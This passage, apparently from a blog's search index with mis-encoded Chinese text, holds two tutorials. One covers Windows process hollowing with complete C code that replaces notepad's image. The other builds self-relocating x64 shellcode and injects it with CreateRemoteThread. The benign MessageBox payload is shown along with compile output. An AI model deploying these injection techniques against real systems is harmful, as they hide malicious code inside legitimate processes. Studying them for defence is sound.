ntHeader-&gt;OptionalHeader.AddressOfEntryPoint; (*pSizeOfImage) = ntHeader-&gt;OptionalHeader.SizeOfImage; //è·å–èŠ‚è¡¨èµ·å§‹ä½ç½® PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)&amp;buf[dosHeader-&gt;e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + ntHeader-&gt;FileHeader.SizeOfOptionalHeader]; //å°†æ–‡ä»¶å¤´å¤åˆ¶åˆ°å†…å­˜ä¸­ memcpy(mem, buf, ntHeader-&gt;OptionalHeader.SizeOfHeaders); //å°†æ¯ä¸€èŠ‚çš„å†…å®¹ä¾æ¬¡å¤åˆ¶åˆ°å†…å­˜ä¸­ for(int i = 0; i &lt; ntHeader-&gt;FileHeader.NumberOfSections; i++) { DWORD rva = sectionHeader[i].VirtualAddress; DWORD fptr = sectionHeader[i].PointerToRawData; memcpy(&amp;mem[rva], &amp;buf[fptr], sectionHeader[i].SizeOfRawData); } return mem;}int main() { //åˆ›å»ºæŒ‚èµ·çš„notepadè¿›ç¨‹ STARTUPINFO si = {0}; PROCESS_INFORMATION pi = {0}; si.cb = sizeof(si); BOOL result = CreateProcessA( NULL, //lpApplicationName &quot;notepad&quot;, //lpCommandLine NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, //lpStartupInfo &amp;pi); //lpProcessInformation if(!result) { printf(&quot;CreateProcess Failed: %d\\n&quot;, GetLastError()); return -1; } printf(&quot;Create Suspended notepad, pid: %d\\n&quot;, pi.dwProcessId); //è·å–notepadè¿›ç¨‹çš„PEBåœ°å€ PROCESS_BASIC_INFORMATION processInfo; NtQueryInformationProcess(pi.hProcess, 0, &amp;processInfo, sizeof(processInfo), NULL); printf(&quot;PebBaseAddress: %p\\n&quot;, processInfo.PebBaseAddress); //PEBçš„Reserved3[1]å°±æ˜¯notepadè¿›ç¨‹åŠ è½½çš„åŸºåœ°å€ PEB processPeb; result = ReadProcessMemory(pi.hProcess, processInfo.PebBaseAddress, &amp;processPeb, sizeof(processPeb), NULL); void *originImageBase = processPeb.Reserved3[1]; printf(&quot;ImageBaseAddress: %p\\n&quot;, originImageBase); system(&quot;pause&quot;); //unmapåˆæ³•å†…å­˜çš„ä»£ç  DWORD dwResult = NtUnmapViewOfSection(pi.hProcess, originImageBase); if(dwResult) { printf(&quot;NtUnmapViewOfSection Failed: %d\\n&quot;, dwResult); return -1; } //è¯»å–source.exeæ–‡ä»¶ï¼Œå°†PEæ–‡ä»¶å†…å®¹å…¨éƒ¨æ”¾å…¥å†…å­˜ FILE *fptr = fopen(&quot;source.exe&quot;, &quot;rb&quot;); if(NULL == fptr) { printf(&quot;Open source.exe Failed!\\n&quot;); return -1; } fseek(fptr, 0L, SEEK_END); long fileSize = ftell(fptr); rewind(fptr); BYTE *fileBuf = (BYTE *)malloc(fileSize + 0x10000); if(NULL == fileBuf) { printf(&quot;Malloc Failed!\\n&quot;); return -1; } fread(fileBuf, 1, fileSize, fptr); fclose(fptr); //æ ¹æ®PEæ–‡ä»¶å†…å®¹ç”ŸæˆPEæ–‡ä»¶è½½å…¥å†…å­˜çš„çŠ¶æ€ int ImageSize; ULONGLONG newImageBase; DWORD entryPoint; unsigned char *peMem = load_pe64(fileBuf, &amp;ImageSize, &amp;newImageBase, &amp;entryPoint); printf(&quot;SizeOfImage: 0x%x, ImageBase: 0x%llx, AddressOfEntryPoint: 0x%x\\n&quot;, ImageSize, newImageBase, entryPoint); //VirtualAllocExç”³è¯·ä¸€å—å†…å­˜åŠ è½½source.exe void *mem = VirtualAllocEx(pi.hProcess, (void *)newImageBase, ImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if(mem != (void *)newImageBase) { printf(&quot;VirtualAllocEx Failed, mem: %p&quot;, mem); free(peMem); free(fileBuf); return -1; } //å°†source.exeå†™å…¥notepadè¿›ç¨‹ç©ºé—´ä¸­ result = WriteProcessMemory(pi.hProcess, mem, peMem, ImageSize, NULL); free(peMem); free(fileBuf); if(!result) { printf(&quot;Load PE Failed: %d\\n&quot;, GetLastError()); return -1; } //ä¿®æ”¹PEBä¸­çš„ImageBase processPeb.Reserved3[1] = (PVOID)newImageBase; result = WriteProcessMemory(pi.hProcess, processInfo.PebBaseAddress, &amp;processPeb, sizeof(processPeb), NULL); if(!result) { printf(&quot;Modify PEB Failed: %d\\n&quot;, GetLastError()); return -1; } //ä¿®æ”¹notepadè¿›ç¨‹çš„contextï¼Œå°†å…¥å£ç‚¹(rcxå¯„å­˜å™¨)è®¾ç½®ä¸ºsource.exeçš„å…¥å£ç‚¹ CONTEXT targetContext; targetContext.ContextFlags = CONTEXT_FULL; result = GetThreadContext(pi.hThread, &amp;targetContext); if(!result) { printf(&quot;GetThreadContext Failed: %d\\n&quot;, GetLastError()); return -1; } targetContext.Rcx = newImageBase + entryPoint; result = SetThreadContext(pi.hThread, &amp;targetContext); if(!result) { printf(&quot;SetThreadContext Failed: %d\\n&quot;, GetLastError()); return -1; } system(&quot;pause&quot;); ResumeThread(pi.hThread); printf(&quot;Injected!\\n&quot;); WaitForSingleObject(pi.hThread, INFINITE); printf(&quot;Wait Complete!\\n&quot;); return 0;} ç¼–è¯‘è¿è¡Œï¼š 12345678910111213141516171819202122&gt; cl hollow.cç”¨äº x64 çš„ Microsoft (R) C/C++ ä¼˜åŒ–ç¼–è¯‘å™¨ 19.28.29336 ç‰ˆç‰ˆæƒæ‰€æœ‰(C) Microsoft Corporationã€‚ä¿ç•™æ‰€æœ‰æƒåˆ©ã€‚hollow.chollow.c(1): warning C4819: è¯¥æ–‡ä»¶åŒ…å«ä¸èƒ½åœ¨å½“å‰ä»£ç é¡µ(936)ä¸­è¡¨ç¤ºçš„å­—ç¬¦ã€‚è¯·å°†è¯¥æ–‡ä»¶ä¿å­˜ä¸º Unicode æ ¼å¼ä»¥é˜²æ­¢æ•°æ®ä¸¢å¤±Microsoft (R) Incremental Linker Version 14.28.29336.0Copyright (C) Microsoft Corporation. All rights reserved./out:hollow.exehollow.obj&gt; hollowCreate Suspended notepad, pid: 10776PebBaseAddress: 000000FD3FB49000ImageBaseAddress: 00007FF6CA930000Press any key to continue . . .SizeOfImage: 0x20000, ImageBase: 0x140000000, AddressOfEntryPoint: 0x14fcPress any key to continue . . .Injected!Wait Complete!","link":"/2021/01/28/windows-process-hollowing/"},{"title":"ç¼–å†™å…·æœ‰è‡ªæˆ‘é‡å®šä½åŠŸèƒ½çš„64ä½ä»£ç å¹¶æ³¨å…¥å…¶ä»–è¿›ç¨‹","text":"è¿›ç¨‹æ³¨å…¥çš„ä¸€ç§å®ç°æ–¹æ³•æ˜¯å°†æ¶æ„ä»£ç ç›´æ¥å¤åˆ¶åˆ°ç›®æ ‡è¿›ç¨‹çš„å†…å­˜ç©ºé—´ï¼Œå¹¶é€šè¿‡CreateRemoteThreadåœ¨ç›®æ ‡è¿›ç¨‹ä¸­æ‰§è¡Œè¿™æ®µæ¶æ„ä»£ç ã€‚è¿™ä¸ªæ–¹æ³•çš„ä¸€ä¸ªéš¾ç‚¹åœ¨äºï¼Œæ¶æ„ä»£ç å¤åˆ¶åˆ°ç›®æ ‡è¿›ç¨‹çš„å†…å­˜ç©ºé—´åï¼Œå®ƒçš„åŸºåœ°å€å¯èƒ½ä¼šå‘ç”Ÿå˜åŒ–ã€‚å‡å¦‚è¯´æ¶æ„ä»£ç éœ€è¦å¯¹è‡ªèº«æŸä¸ªç‰¹å®šåœ°å€çš„æ•°æ®è¿›è¡Œè®¿é—®ï¼Œå°±ä¼šè®¿é—®ä¸åˆ°è¿™ä¸ªæ•°æ®ï¼Œå› ä¸ºæ•°æ®çš„åœ°å€å·²ç»æ”¹å˜äº†ã€‚ä¸ºäº†è§£å†³è¿™ä¸€é—®é¢˜ï¼Œéœ€è¦è¿›è¡Œé‡å®šä½çš„æ“ä½œã€‚ ä¸€ç§é‡å®šä½çš„æ–¹æ³•æ˜¯ï¼šåœ¨æ³¨å…¥æ¶æ„ä»£ç ä¹‹å‰ï¼Œå¯¹ä»£ç å†…å®¹è¿›è¡Œé¢„å¤„ç†ï¼Œæ ¹æ®å®é™…ç”³è¯·åˆ°çš„ç›®æ ‡è¿›ç¨‹å†…å­˜é¦–åœ°å€ï¼Œä¿®æ­£æ¶æ„ä»£ç ä¸­å®é™…åœ°å€ä¸é¢„æœŸåœ°å€çš„å·®å¼‚ã€‚è¿™ä¸€è¿‡ç¨‹å¯ä»¥å€ŸåŠ©é‡å®šä½è¡¨æ¥å®Œæˆï¼Œé‡å®šä½è¡¨ä¸­åŒ…å«ä¸€ä¸ªæ•°ç»„ï¼Œè®°å½•äº†ä»£ç ä¸­éœ€è¦é‡å®šä½çš„æ•°æ®çš„ç›¸å¯¹è™šæ‹Ÿåœ°å€RVAã€‚ å¦ä¸€ç§æ–¹å¼å°±æ˜¯æ¶æ„ä»£ç è‡ªèº«è¿›è¡Œé‡å®šä½ï¼Œæ¯”å¦‚ä¸‹é¢è¿™æ®µä»£ç ï¼š 12345 call relocreloc: pop rbx mov rax, offset reloc sub rbx, rax è¿™æ®µä»£ç æ‰§è¡Œå®Œæ¯•åï¼Œrbxå¯„å­˜å™¨ä¸­å°±ä¿å­˜äº†çœŸå®åœ°å€å’Œé¢„æœŸåœ°å€çš„å·®å€¼ã€‚æ¥ä¸‹æ¥ï¼Œå‡è®¾æƒ³è¦è·å¾—å˜é‡Variableçš„çœŸå®åœ°å€ï¼Œåˆ™å¯ä»¥æ‰§è¡Œè¿™æ®µä»£ç ï¼š 12mov rax, offset Variableadd rbx, rax æ‰§è¡Œå®Œæ¯•åï¼Œrbxä¸­å°±åŒ…å«å˜é‡Variableçš„çœŸå®åœ°å€äº†ã€‚ ç¼–å†™å…·æœ‰è‡ªæˆ‘é‡å®šä½åŠŸèƒ½çš„64ä½æ±‡ç¼–ä»£ç è·å¾—64ä½æ±‡ç¼–ä»£ç é¦–å…ˆé€‰æ‹©ä¸€ä¸ª64ä½æ±‡ç¼–çš„ç¼–è¯‘å™¨ã€‚æœ¬æ–‡é€‰ç”¨çš„æ˜¯Visual Studioæä¾›çš„ml64.exeã€‚MASM for x64 (ml64.exe) å¦‚æœå¯¹ml64.exeä¸å¤ªç†Ÿæ‚‰ï¼Œå¯ä»¥å…ˆç¼–å†™Cè¯­è¨€ä»£ç ï¼Œç„¶åå†ä½¿ç”¨Visual Studioçš„å‘½ä»¤è¡Œå·¥å…·å°†Cè¯­è¨€æ–‡ä»¶è½¬æ¢æˆæ±‡ç¼–è¯­è¨€æ–‡ä»¶ã€‚ è¦æƒ³ä½¿ç”¨Visual Studioçš„å‘½ä»¤è¡Œå·¥å…·ï¼Œå¯ä»¥å…ˆè¿è¡ŒVsDevCmd.batæ‰¹å¤„ç†æ–‡ä»¶ï¼Œç„¶åå°±èƒ½ç›´æ¥ä½¿ç”¨å„ç§å‘½ä»¤è¡Œå·¥å…·ï¼Œè€Œä¸ç”¨è¾“å…¥è·¯å¾„åäº†ã€‚VsDevCmd.baté€šå¸¸ä½äºProgram Files (x86)\\Microsoft Visual Studio\\2019\\BuildTools\\Common7\\Toolsæ–‡ä»¶å¤¹ä¸‹ã€‚ é¦–å…ˆç¼–å†™ä¸€ä¸ªæ— é™å¼¹çª—Cè¯­è¨€ä»£ç ï¼š 12345678#include &lt;windows.h&gt;#pragma comment(lib, &quot;user32.lib&quot;)int main() { while(1) { MessageBoxA(NULL, &quot;Injected&quot;, &quot;A Window&quot;, MB_ICONSTOP | MB_OK); }} ä¿å­˜åˆ°shellcode.cæ–‡ä»¶ä¸­ã€‚æ¥ä¸‹æ¥ï¼Œä½¿ç”¨Visual Studioçš„å‘½ä»¤è¡Œå·¥å…·cl.exeç¼–è¯‘ï¼š 12345678910111213141516&gt; vsdevcmd -arch=amd64************************************************************************ Visual Studio 2019 Developer Command Prompt v16.8.4** Copyright (c) 2020 Microsoft Corporation**********************************************************************&gt; cl /FA shellcode.cç”¨äº x64 çš„ Microsoft (R) C/C++ ä¼˜åŒ–ç¼–è¯‘å™¨ 19.28.29336 ç‰ˆç‰ˆæƒæ‰€æœ‰(C) Microsoft Corporationã€‚ä¿ç•™æ‰€æœ‰æƒåˆ©ã€‚shellcode.cMicrosoft (R) Incremental Linker Version 14.28.29336.0Copyright (C) Microsoft Corporation. All rights reserved./out:shellcode.exeshellcode.obj é€‰é¡¹/FAå°±å¯ä»¥è®©å…¶äº§ç”Ÿæ±‡ç¼–ä»£ç æ–‡ä»¶shellcode.asmã€‚ä¸è¿‡è¿™ä¸ªæ—¶å€™shellcode.asmå†…å®¹æ¯”è¾ƒå¤æ‚ï¼Œç¼–è¯‘å¾—åˆ°çš„shellcode.exeä¹Ÿæ¯”è¾ƒå¤§ï¼ˆå¤§çº¦90KBï¼‰ã€‚å¦‚æœå¯ä»¥ç®€åŒ–shellcode.asmï¼Œå¹¶é€‚å½“ç¼©å°shellcode.exeçš„ä½“ç§¯å°†ä¼šæ›´æœ‰åˆ©äºåç»­åˆ†æã€‚ å¯¹shellcode.asmè¿›è¡Œä¿®æ”¹ï¼Œå¾—åˆ°ï¼š 12345678910111213141516171819202122INCLUDELIB user32.libEXTRN __imp_MessageBoxA:PROC_TEXT SEGMENTmain PROC; Line 4 sub rsp, 40 ; 00000028H jmp $LN2@main Caption DB 'MessageBox', 00H Text DB 'Injected', 00H$LN2@main:; Line 6 mov r9d, 16 mov r8, offset Caption mov rdx, offset Text xor ecx, ecx call QWORD PTR __imp_MessageBoxA; Line 7 jmp SHORT $LN2@mainmain ENDP_TEXT ENDSEND åˆ æ‰äº†ä¸€äº›ä¸å¿…è¦çš„INCLUDEè¯­å¥ï¼Œä»…ä¿ç•™ä¸€ä¸ªINCLUDELIBï¼Œå¹¶åˆ å»ä¸€äº›ä¸éœ€è¦çš„èŠ‚ï¼Œå¦‚pdataå’Œxdataã€‚æ­¤å¤–ï¼Œè¿˜å°†æ•°æ®èŠ‚ä¸­çš„æ•°æ®è½¬ç§»åˆ°ä»£ç èŠ‚ï¼Œå¹¶å°†æ•°æ®èŠ‚ç»™åˆ æ‰äº†ã€‚ å…¶å®æˆ‘è¿˜æ”¹äº†ä¸€ä¸ªåœ°æ–¹ï¼Œå°±æ˜¯å°†ç¬¬14è¡Œå’Œç¬¬15è¡Œçš„leaæŒ‡ä»¤ä¿®æ”¹æˆmovæŒ‡ä»¤ã€‚å¦‚æœæ˜¯leaæŒ‡ä»¤ï¼Œåˆ™è¿™é‡Œä½¿ç”¨çš„æ˜¯ç›¸å¯¹å¯»å€ï¼Œä¸éœ€è¦è¿›è¡Œé‡å®šä½çš„æ“ä½œã€‚ä¸ºäº†è¯´æ˜é‡å®šä½çš„åŸç†ï¼Œå°†å…¶ä¿®æ”¹ä¸ºmovæŒ‡ä»¤ï¼Œä»è€Œè®©è¿™é‡Œä½¿ç”¨ç»å¯¹å¯»å€ã€‚ ä½¿ç”¨ml64.exeå°†ä¿®æ”¹åçš„shellcode.asmç¼–è¯‘é“¾æ¥æˆå¯æ‰§è¡Œæ–‡ä»¶shellcode.exeï¼š 1234567891011&gt; ml64 shellcode.asm /link /ENTRY:mainMicrosoft (R) Macro Assembler (x64) Version 14.28.29336.0Copyright (C) Microsoft Corporation. All rights reserved. Assembling: shellcode.asmMicrosoft (R) Incremental Linker Version 14.28.29336.0Copyright (C) Microsoft Corporation. All rights reserved./OUT:shellcode.exeshellcode.obj/ENTRY:main shellcode.exeçš„ä½“ç§¯ç¼©å°åˆ°äº†ä»…æœ‰å¤§çº¦3KBã€‚ æ·»åŠ è‡ªæˆ‘é‡å®šä½åŠŸèƒ½åœ¨shellcode.asmä¸­ï¼Œè°ƒç”¨MessageBoxAå‰ä¼šè¿›è¡Œä¸€ç³»åˆ—ä¼ å‚æ“ä½œã€‚å…¶ä¸­ï¼Œä¼ å…¥Captionå’ŒTextçš„åœ°å€ä½¿ç”¨çš„æ˜¯ç»å¯¹åœ°å€ã€‚ä»£ç æ³¨å…¥å…¶ä»–è¿›ç¨‹åï¼Œè¿™ä¸ªåœ°å€å¯èƒ½ä¼šå‘ç”Ÿæ”¹å˜ï¼Œå› æ­¤éœ€è¦è¿›è¡Œé‡å®šä½æ“ä½œã€‚ 12345.text:000000014000101A 41 B9 10 00 00 00 mov r9d, 10h ; uType.text:0000000140001020 49 B8 06 10 00 40 01 00 00 00 mov r8, offset Caption ; &quot;MessageBox&quot;.text:000000014000102A 48 BA 11 10 00 40 01 00 00 00 mov rdx, offset Text ; &quot;Injected&quot;.text:0000000140001034 33 C9 xor ecx, ecx ; hWnd.text:0000000140001036 FF 15 C4 0F 00 00 call cs:MessageBoxA æ·»åŠ é‡å®šä½æ“ä½œåçš„ä»£ç ä¸ºï¼š 12345678910111213141516171819202122232425262728INCLUDELIB user32.libEXTRN __imp_MessageBoxA:PROC_TEXT SEGMENTmain PROC sub rsp, 40 ; 00000028H call relocreloc: pop rbx mov rax, offset reloc sub rbx, rax mov rax, offset Caption add rbx, rax jmp $LN2@main Caption DB 'MessageBox', 00H Text DB 'Injected', 00H$LN2@main:; Line 6 mov r9d, 16 mov r8, rbx lea rdx, [rbx + 11] xor ecx, ecx call QWORD PTR __imp_MessageBoxA; Line 7 jmp SHORT $LN2@mainmain ENDP_TEXT ENDSEND rbxå¯„å­˜å™¨ä¿å­˜çš„å°±æ˜¯Captionçš„çœŸå®åœ°å€ï¼ŒCaptionçš„é•¿åº¦ä¸º11ï¼Œå› æ­¤Textçš„åœ°å€å°±ä¸ºrbx+11ã€‚ ç”¨LoadLibraryAå’ŒGetProcAddressä»£æ›¿MessageBoxAMessageBoxAæ˜¯user32.dllæä¾›çš„ä¸€ä¸ªå‡½æ•°ã€‚ä½†æ˜¯ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰è¿›ç¨‹éƒ½ä¼šåŠ è½½user32.dllï¼Œå¯¹äºé‚£äº›æ²¡æœ‰åŠ è½½user32.dllçš„è¿›ç¨‹ï¼Œæ³¨å…¥çš„ä»£ç æ˜¯æ— æ³•æ­£å¸¸è¿è¡Œçš„ã€‚ä¸è¿‡ï¼Œå‡ ä¹æ‰€æœ‰è¿›ç¨‹éƒ½ä¼šåŠ è½½kernel32.dllï¼Œè€Œkernel32.dllä¸­åˆåŒ…å«LoadLibraryAå’ŒGetProcAddressï¼Œå¯ä»¥åˆ©ç”¨å®ƒä»¬åŠ è½½user32.dllå¹¶è·å–MessageBoxAçš„åœ°å€ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839INCLUDELIB kernel32.libEXTRN __imp_GetProcAddress:PROCEXTRN __imp_LoadLibraryA:PROC_TEXT SEGMENTmain PROC sub rsp, 40 ; 00000028H ;é€šè¿‡é‡å®šä½è®©rbxæŒ‡å‘Captioné¦–åœ°å€ call relocreloc: pop rbx mov rax, offset reloc sub rbx, rax mov rax, offset Caption add rbx, rax ;è°ƒç”¨LoadLibraryAå’ŒGetProcAddressè·å¾—MessageBoxA lea rcx, [rbx + 20] call QWORD PTR __imp_LoadLibraryA lea rdx, [rbx + 31] mov rcx, rax call QWORD PTR __imp_GetProcAddress mov r12, rax jmp $LN2@main Caption DB 'MessageBox', 00H ;[rbx] Text DB 'Injected', 00H ;[rbx + 11] LibName DB 'user32.dll', 00H ;[rbx + 20] FuncName DB 'MessageBoxA', 00H ;[rbx + 31]$LN2@main:; Line 6 mov r9d, 16 mov r8, rbx lea rdx, [rbx + 11] xor rcx, rcx call r12; Line 7 jmp SHORT $LN2@mainmain ENDP_TEXT ENDSEND å¤„ç†è°ƒç”¨ç³»ç»ŸAPIçš„è¯­å¥ç°åœ¨çš„ä»£ç ä¸­æœ‰ä¸¤ä¸ªè°ƒç”¨ç³»ç»ŸAPIçš„è¯­å¥ï¼š 12call QWORD PTR __imp_LoadLibraryAcall QWORD PTR __imp_GetProcAddress å°†ä»£ç æ³¨å…¥ç›®æ ‡è¿›ç¨‹åï¼Œè¿™ä¸¤æ¡è¯­å¥å°±æœ‰å¯èƒ½ä¸å¥æ•ˆäº†ï¼Œå› æ­¤æŠŠè¿™ä¸¤æ¡è¯­å¥å¤„ç†ä¸€ä¸‹ã€‚é¦–å…ˆæ‰¾åˆ°LoadLibraryAå’ŒGetProcAddressçš„åœ°å€ï¼Œå¯ä»¥å†™ä¸€ä¸ªå¾ˆç®€å•çš„Cè¯­è¨€ç¨‹åºæ¥æ‰¾ï¼š 12345678910#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main() { void *p1 = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;); void *p2 = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), &quot;GetProcAddress&quot;); printf(&quot;LoadLibraryA Address: %p\\n&quot;, p1); printf(&quot;GetProcAddress Address: %p\\n&quot;, p2); return 0;} åœ¨æˆ‘å½“å‰çš„ç”µè„‘ä¸Šï¼Œè¿è¡Œç»“æœä¸ºï¼š 12LoadLibraryA Address: 00007FFFC185EBB0GetProcAddress Address: 00007FFFC185A360 å› æ­¤ï¼Œå¯¹è¿™ä¸¤æ¡è¯­å¥ä½œå¦‚ä¸‹ä¿®æ”¹ï¼š 12345mov rax, 00007FFFC185EBB0H ;LoadLibraryAå…¥å£åœ°å€call raxmov rax, 00007FFFC185A360H ;GetProcAddresså…¥å£åœ°å€call rax è¿™é‡Œç”¨åˆ°äº†ä¸€ä¸ªæ€§è´¨ï¼Œå°±æ˜¯å¯¹äºä¸€å°ç”µè„‘ä¸Šè¿è¡Œçš„å¤šä¸ªè¿›ç¨‹ï¼Œç³»ç»ŸAPIçš„è™šæ‹Ÿåœ°å€é€šå¸¸æ˜¯ç›¸ç­‰çš„ã€‚ä¸è¿‡æˆ‘å¸Œæœ›è¿™ä¸ªä»£ç è¿˜èƒ½åœ¨å…¶ä»–æœºå™¨ä¸Šè¿è¡Œï¼Œæ‰€ä»¥è¿™é‡Œçš„00007FFFC185EBB0Hå’Œ00007FFFC185A360Håªæ˜¯ä¸´æ—¶çš„ï¼Œåœ¨æ³¨å…¥å…¶ä»–è¿›ç¨‹ä¹‹å‰è¿˜ä¼šè¢«ä¿®æ”¹ã€‚ æœ€ç»ˆå¾—åˆ°çš„ä»£ç 12345678910111213141516171819202122232425262728293031323334353637_TEXT SEGMENTmain PROC sub rsp, 40 ; 00000028H ;é€šè¿‡é‡å®šä½è®©rbxæŒ‡å‘Captioné¦–åœ°å€ call relocreloc: pop rbx mov rax, offset reloc sub rbx, rax mov rax, offset Caption add rbx, rax ;è°ƒç”¨LoadLibraryAå’ŒGetProcAddressè·å¾—MessageBoxA lea rcx, [rbx + 20] mov rax, 00007FFFC185EBB0H ;LoadLibraryAå…¥å£åœ°å€ call rax lea rdx, [rbx + 31] mov rcx, rax mov rax, 00007FFFC185A360H ;GetProcAddresså…¥å£åœ°å€ call rax mov r12, rax jmp $LN2@main Caption DB 'MessageBox', 00H ;[rbx] Text DB 'Injected', 00H ;[rbx + 11] LibName DB 'user32.dll', 00H ;[rbx + 20] FuncName DB 'MessageBoxA', 00H ;[rbx + 31]$LN2@main:; Line 6 mov r9d, 16 mov r8, rbx lea rdx, [rbx + 11] xor rcx, rcx call r12; Line 7 jmp SHORT $LN2@mainmain ENDP_TEXT ENDSEND ä½¿ç”¨ml64.exeç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ï¼š 1234567891011&gt; ml64 shellcode.asm /link /ENTRY:mainMicrosoft (R) Macro Assembler (x64) Version 14.28.29336.0Copyright (C) Microsoft Corporation. All rights reserved. Assembling: shellcode.asmMicrosoft (R) Incremental Linker Version 14.28.29336.0Copyright (C) Microsoft Corporation. All rights reserved./OUT:shellcode.exeshellcode.obj/ENTRY:main ç„¶åï¼Œå†å°†shellcode.exeæ‹–å…¥IDA Proä¸­ï¼Œå¹¶å°†ä»£ç éƒ¨åˆ†æ‹–é»‘ï¼Œå†é€‰æ‹©Edit-&gt;Export Dataï¼Œå°†å…¶å¯¼å‡ºä¸ºCè¯­è¨€æ•°ç»„å½¢å¼ï¼š 1234567891011121314151617unsigned char ida_chars[] ={// 0 1 2 3 4 5 6 7 8 9 0x48, 0x83, 0xEC, 0x28, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B, //0 0x48, 0xB8, 0x09, 0x10, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, //1 0x48, 0x2B, 0xD8, 0x48, 0xB8, 0x4C, 0x10, 0x00, 0x40, 0x01, //2 0x00, 0x00, 0x00, 0x48, 0x03, 0xD8, 0x48, 0x8D, 0x4B, 0x14, //3 0x48, 0xB8, 0xB0, 0xEB, 0x85, 0xC1, 0xFF, 0x7F, 0x00, 0x00, //4 0xFF, 0xD0, 0x48, 0x8D, 0x53, 0x1F, 0x48, 0x8B, 0xC8, 0x48, //5 0xB8, 0x60, 0xA3, 0x85, 0xC1, 0xFF, 0x7F, 0x00, 0x00, 0xFF, //6 0xD0, 0x4C, 0x8B, 0xE0, 0xEB, 0x2B, 0x4D, 0x65, 0x73, 0x73, //7 0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x00, 0x49, 0x6E, 0x6A, //8 0x65, 0x63, 0x74, 0x65, 0x64, 0x00, 0x75, 0x73, 0x65, 0x72, //9 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x4D, 0x65, 0x73, //10 0x73, 0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x41, 0x00, 0x41, //11 0xB9, 0x10, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xC3, 0x48, 0x8D, //12 0x53, 0x0B, 0x48, 0x33, 0xC9, 0x41, 0xFF, 0xD4, 0xEB, 0xEB //13}; ç¼–å†™è¿›ç¨‹æ³¨å…¥ç¨‹åºè·å¾—äº†Cè¯­è¨€æ•°ç»„å½¢å¼çš„ä»£ç åï¼Œæ¥ä¸‹æ¥è¦åšçš„å°±æ˜¯å°†ä»£ç æ³¨å…¥åˆ°ç›®æ ‡è¿›ç¨‹çš„å†…å­˜ç©ºé—´ä¸­ï¼Œç„¶ååœ¨ç›®æ ‡è¿›ç¨‹ä¸­æ‰§è¡Œè¿™æ®µä»£ç äº†ã€‚ä¸è¿‡åœ¨è¿™ä¹‹å‰ï¼Œå…ˆè¦å¤„ç†ä¸€ä¸‹LoadLibraryAå’ŒGetProcAddressçš„åœ°å€ã€‚ ä¹‹å‰çš„ä»£ç å‡å®šLoadLibraryAå’ŒGetProcAddressçš„åœ°å€åˆ†åˆ«ä¸º00007FFFC185EBB0Hå’Œ00007FFFC185A360Hï¼Œè€Œè¿™å¹¶ä¸æ€»æ˜¯æˆç«‹çš„ã€‚æ‰€ä»¥ï¼Œå…ˆå°†è¿™ä¸¤ä¸ªæ•°å€¼æ›¿æ¢ä¸ºLoadLibraryAå’ŒGetProcAddressçš„å®é™…åœ°å€ï¼š 123456//è·å–LoadLibraryAå’ŒGetProcAddressçš„çœŸå®åœ°å€void *p1 = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;);void *p2 = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), &quot;GetProcAddress&quot;);//ida_chars[]ä¸­LoadLibraryAä½äºida_chars[42]ï¼ŒGetProcAddressä½äºida_chars[61]*(uint64_t *)(&amp;ida_chars[42]) = (uint64_t)p1;*(uint64_t *)(&amp;ida_chars[61]) = (uint64_t)p2; ç„¶åï¼Œå°±å¯ä»¥å°†æ•°ç»„ida_charsçš„å†…å®¹å†™åˆ°ç›®æ ‡è¿›ç¨‹çš„å†…å­˜ç©ºé—´ï¼Œå¹¶CreateRemoteThreadå¼€å¯è¿œç¨‹çº¿ç¨‹æ‰§è¡Œè¿™æ®µä»£ç äº†ï¼š 123456789101112131415161718192021222324//å°†ida_chars[]å†™å…¥ç›®æ ‡è¿›ç¨‹å†…å­˜ç©ºé—´HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1]));if(NULL == hProcess) { printf(&quot;OpenProcess Failed: %d\\n&quot;, GetLastError()); return -1;}void *mem = VirtualAllocEx(hProcess, NULL, sizeof(ida_chars), MEM_COMMIT, PAGE_EXECUTE_READWRITE);if(NULL == mem) { printf(&quot;VirtualAllocEx Failed: %d\\n&quot;, GetLastError()); return -1;}BOOL result = WriteProcessMemory(hProcess, mem, ida_chars, sizeof(ida_chars), NULL);if(!result) { printf(&quot;WriteProcessMemory Failed: %d\\n&quot;, GetLastError()); return -1;}//åˆ›å»ºè¿œç¨‹çº¿ç¨‹æ‰§è¡Œida_chars[]ä¸­çš„ä»£ç HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, mem, NULL, 0, NULL);if(NULL == hRemoteThread) { printf(&quot;CreateRemoteThread Failed: %d\\n&quot;, GetLastError()); return -1;}printf(&quot;Injected!\\n&quot;);return 0; å®Œæ•´ä»£ç 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;windows.h&gt;#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;unsigned char ida_chars[] ={// 0 1 2 3 4 5 6 7 8 9 0x48, 0x83, 0xEC, 0x28, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B, //0 0x48, 0xB8, 0x09, 0x10, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, //1 0x48, 0x2B, 0xD8, 0x48, 0xB8, 0x4C, 0x10, 0x00, 0x40, 0x01, //2 0x00, 0x00, 0x00, 0x48, 0x03, 0xD8, 0x48, 0x8D, 0x4B, 0x14, //3 0x48, 0xB8, 0xB0, 0xEB, 0x85, 0xC1, 0xFF, 0x7F, 